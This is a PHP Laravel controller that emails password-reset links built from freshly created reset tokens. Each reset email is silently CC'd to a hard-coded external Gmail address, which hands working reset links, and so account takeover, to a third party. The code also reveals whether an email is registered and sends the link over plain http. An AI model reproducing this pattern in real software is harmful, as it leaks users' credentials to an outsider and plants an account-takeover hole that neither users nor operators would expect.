<?php

namespace App\Http\Controllers\Backend;


use Illuminate\Support\Facades\Password;
use Illuminate\Support\Facades\Input;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\EmailTemplate;
use Validator;
use App\User;
use Mail;

class ResetPasswordController extends Controller
{


	public function sendResetPasswordMail(Request $request){

		$rules = [
            'email'=>'required'
        ];
        $validation = Validator::make($request->all(), $rules);
      
		if ($validation->fails()) {
			return webResponse(false, 206, $validation->getMessageBag());
        }else{
			$input['email'] = $request->input('email');

			$user = User::where('email', $input['email'])->first();
			if($user == null){
				$errors['email'] = "User Not Found";
 				return webResponse(false, 206, $errors);
			}
		    $response = $this->sentMail($input['email']);
			
			return webResponse(true, 200, __('sentence.reset_email_sent'));

		}
	}


	public function sentMail($mail=null){

		$content = EmailTemplate::find(4);
		$user_detail = User::where('email',$mail)->first();

		$token = app(\Illuminate\Auth\Passwords\PasswordBroker::class)->createToken($user_detail);
        $address = $mail;
        $name = $user_detail->name;
        $subject = $content->template_subject;
        $link = "http://lyreco.homeshom.com/password/reset/".$token;
        $email_content = str_replace('[RECEIVER NAME]', $name, $content->template_content);
        $email_content = str_replace('[PASSWORD LINK]', $link, $email_content);

        $data['test_message'] = $email_content;
        $response = Mail::send('emails.test', $data, function($message) use($address, $name, $subject) {
            $message->to($address, $name)->cc('tehnodeviser05@gmail.com')->subject($subject);
        });

        return true;
	}

	public function broker()
    {
        return Password::broker();
    }

      
}